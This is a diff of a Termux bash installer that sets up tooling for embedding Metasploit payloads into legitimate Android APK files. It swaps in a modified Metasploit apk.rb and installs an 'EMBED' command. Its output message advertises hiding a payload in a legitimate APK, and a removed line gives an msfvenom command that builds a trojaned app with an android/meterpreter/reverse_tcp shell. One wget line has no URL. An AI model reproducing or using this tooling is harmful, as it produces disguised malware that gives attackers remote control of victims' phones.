@@ -12,6 +12,7 @@ IFS=$'\n\t'
         W='\033[0m'
 	arm=$(find $PREFIX/share/ -name "jdk8_arm.tar.gz" -type f)
 	aarch=$(find $PREFIX/share/ -name "jdk8_aarch64.tar.gz" -type f)
+	EMBED=$(find $HOME/ -name "embed" -type d)
 
 trap ctrl_c 2
 function ctrl_c () {
@@ -88,9 +89,11 @@ msf=$(find $HOME -name "metasploit-framework" -type d)
 		pkg install git wget tar -y
 		cd $HOME
 		git clone https://github.com/ivam3/java.git
+		mkdir -p $HOME/java/unsigned
+		mkdir -p $HOME/java/finished
 		chmod 711 -R $HOME/java/
 		chmod 777 -R $HOME/java/openjdk/lib
-		chmod 777 $HOME/java/.embed/apk.rb
+		chmod 777 $HOME/java/.embed/*
 		chmod 777 $HOME/java/openjdk/java
 		chmod 777 $HOME/java/openjdk/bin/java
 		chmod 777 $HOME/java/apktool
@@ -103,17 +106,37 @@ msf=$(find $HOME -name "metasploit-framework" -type d)
 	if [ -L $PREFIX/bin/zzipalign ]; then
                 rm $PREFIX/bin/zzipalign
 	fi
+	if [ -L $PREFIX/bin/publickey.pk8 ]; then
+                rm $PREFIX/bin/publickey.pk8
+        fi
+	if [ -L $PREFIX/bin/publickey.x509.pem ]; then
+                rm $PREFIX/bin/publickey.x509.pem
+        fi
 
 ln -s $HOME/embed/openjdk/zzipalign $PREFIX/bin/
 ln -s $HOME/java/.embed/signapk $PREFIX/bin/
 bash $HOME/java/Ivam3
+mv $msf/lib/msf/core/payload/apk.rb $msf/lib/msf/core/payload/apk.rb.O
+cp $HOME/java/.embed/apk.rb $msf/lib/msf/core/payload/
+
+	if [ -d $EMBED ]; then
+		cp $EMBED/EMBED $HOME/java/
+		chmod 511 $HOME/java/EMBED
+		ln -s $HOME/java/EMBED $PREFIX/bin/
+		rm -rf $EMBED
+	else
+		cd $HOME/java/
+		wget
+		chmod 511 $HOME/java/EMBED
+		ln -s $HOME/java/EMBED $PREFIX/bin/
+	fi
 
 	if [ -f $arm ] || [ -f $aarch ]; then
 		printf "$C"
 		Chao_chao
 		cd $HOME
-printf "$C [!]$G Finish !! \n \t Now try it following that example : \n $G msfvenom -x legitim.apk -p android/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=0000 R > embed.apk$W
-\n"
+printf "$Y [IbyC]$C Finish !!$W \n \t Now you can hide a metasploit payload in legitim .APK \n \t \t Now try it by executing the command$G => EMBED
+$W \n"
 printf "$Y [!]$W If something was wrong, JOIN me on =>$B https://t.me/Ivam3by_Cinderella$W
 \n"
 	else
